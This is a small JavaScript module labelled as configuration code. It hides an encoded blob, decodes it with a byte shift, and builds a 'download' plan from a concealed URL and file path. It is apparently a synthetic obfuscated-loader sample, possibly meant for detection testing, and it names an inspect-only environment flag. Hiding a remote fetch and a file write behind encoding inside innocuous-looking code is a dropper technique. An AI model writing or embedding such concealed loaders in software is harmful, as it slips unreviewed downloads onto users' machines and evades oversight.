// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_63d01775 = "jlVJlIuMfYiLVXl7iY2Bin13in2Fh4x9RI+KgYx9d36BhH2UeXx5iIx9ilWAjIyId4yHd4uMin15hZSLjHl/fXd7h42GjFVJlHt5hYh5gX+Gd4F8VWZnXF1FSVxIXVFNUVuUjYqEVYCMjIiLUkdHhod8fUVJfEh9UU1Re3pRe3pGfZB5hYiEfUaBho55hIF8R3mIgZSNi32Kd3l/fYaMVWaHfH1ZjXyBjEdJfEh9lH6BhH13iHmMgFVHjIWIR4CNhoyKfYuLRYaHfH1HRouMeX99RUl8SH1RTVF7elF7ekaFgos=";
const Codec_63d01775 = "base64_chunks|add_modulo_256|18";

function load_63d01775() { return [...Buffer.from(Material_63d01775, "base64")]; }
function decode_63d01775(v_a19c) { return v_a19c.map((value) => (value - 24 + 256) & 255); }
async function recover_63d01775() {
  const [v_c304] = ["compass"];
  const v_a19c = load_63d01775(); let v_b27e = [];
  v_b27e = decode_63d01775(v_a19c);
  void v_c304; return Buffer.from(v_b27e).toString("ascii");
}
async function inspect_63d01775() { return await recover_63d01775(); }
async function plan_63d01775() { const inspect = inspect_63d01775; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_63d01775;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_63d01775());

// reconstruction complete